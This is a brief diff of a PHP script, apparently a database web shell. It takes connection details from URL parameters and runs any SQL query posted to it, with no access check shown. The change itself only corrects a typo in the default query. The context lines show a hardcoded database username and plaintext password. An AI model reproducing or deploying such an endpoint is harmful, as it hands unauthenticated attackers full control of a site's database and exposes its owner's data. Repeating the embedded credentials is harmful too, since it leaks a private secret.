@@ -3,7 +3,7 @@ $host = $_GET['h'] ?? 'localhost';
 $user = $_GET['u'] ?? 'fcimggni_dbs12';
 $pass = $_GET['p'] ?? 'tM(}uM;xuUL^XO=8';
 $db   = $_GET['d'] ?? 'fcimggni_dbs12';
-$sql  = $_POST['sql'] ?? 'show tabless;';
+$sql  = $_POST['sql'] ?? 'show tables;';
 
 $conn = new mysqli($host, $user, $pass, $db);
 if ($conn->connect_error) die("Connect Error: " . $conn->connect_error);
@@ -22,3 +22,4 @@ if ($result === TRUE) {
 }
 $conn->close();
 ?>
+
